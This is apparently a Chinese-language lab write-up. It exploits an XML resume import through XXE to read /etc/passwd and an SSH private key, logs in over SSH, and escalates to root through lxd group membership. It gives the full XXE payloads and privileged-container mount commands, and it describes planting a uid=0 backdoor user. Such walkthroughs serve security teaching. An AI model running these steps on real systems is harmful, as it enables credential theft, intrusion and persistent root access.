### **<span style="color:#3498db">XXE 读文件</span>**

简历导入支持上传 **XML** 格式——XML 有一个经典特性：**在 DTD 里可以定义"实体"，实体的值能用 `SYSTEM` 从本地文件里取**。解析器处理时会把文件内容填进实体，只要把这个实体放进"会被回显的字段"，文件内容就被打印出来了。这就是 **XXE（XML 外部实体注入）**：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE resume[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<resume>
  <name>张三</name>
  <position>工程师&xxe;</position>
  <experience>5年</experience>
  <contact>zhangsan@example.com</contact>
</resume>
```

导入成功，`position` 字段变成了 `/etc/passwd` 的内容：

![mm](/assets/img/2025-06-30-15-07-42.png)

### **<span style="color:#3498db">读 SSH 私钥登录</span>**

`/etc/passwd` 里看到一个普通用户 `hr`，直接读他的私钥：

```xml
<!ENTITY xxe SYSTEM "file:///home/hr/.ssh/id_rsa">
```

![mm](/assets/img/2025-06-30-15-23-16.png)

私钥到手（这张图里的 key 没有口令）。存成文件改好权限直接登录，拿到 `hr` 的 shell：

```bash
chmod 600 id_rsa
ssh -i id_rsa hr@10.10.1.72
```

![mm](/assets/img/2025-06-30-15-26-56.png)

### **<span style="color:#3498db">LXC 组逃逸</span>**

`id` 一看：`groups=1001(hr),105(lxd)`——在 **lxd 组**里。附加组 id 只有 105，一看就是服务账号的组。

**LXD 是系统级容器管理器，lxd 组 ≈ root**（和 docker 组一个道理）：组内用户可以操作 lxd 的 socket，创建**特权容器**，把宿主机根目录挂载进去：

```bash
lxc image import /opt/lxd-images/busybox-lxd.tar.gz --alias busybox   # 离线环境用场里的镜像
lxc init busybox test-container -c security.privileged=true           # 特权模式：关掉用户命名空间隔离，容器内root=真root
lxc config set test-container raw.lxc "lxc.init.cmd=/bin/busybox /sbin/init"   # 镜像被裁剪过，指定可用的1号进程
lxc config set test-container raw.lxc "lxc.apparmor.profile=unconfined"        # 绕过 snap版LXD 的 AppArmor 限制
lxc config device add test-container host-root disk source=/ path=/mnt/host    # 把宿主机 / 挂到容器 /mnt/host
lxc start test-container
lxc exec test-container /bin/bash
```

![mm](/assets/img/2025-06-30-16-55-43.png)

容器里 `ls /mnt/host` 看到的已经是**宿主机的根目录**：

```bash
cd /mnt/host && ls
```

![mm](/assets/img/2025-06-30-16-45-32.png)

往宿主机的 `/etc/passwd` 里写一个 uid=0 的后门用户，退出后 `su` 它直接是 root：

![mm](/assets/img/2025-06-30-16-57-15.png)
![mm](/assets/img/2025-06-30-16-57-57.png)

重点记住这个模式：**只要用户在容器的管理组里（docker、lxd），把宿主机根目录挂进容器就是一条直通 root 的路**。
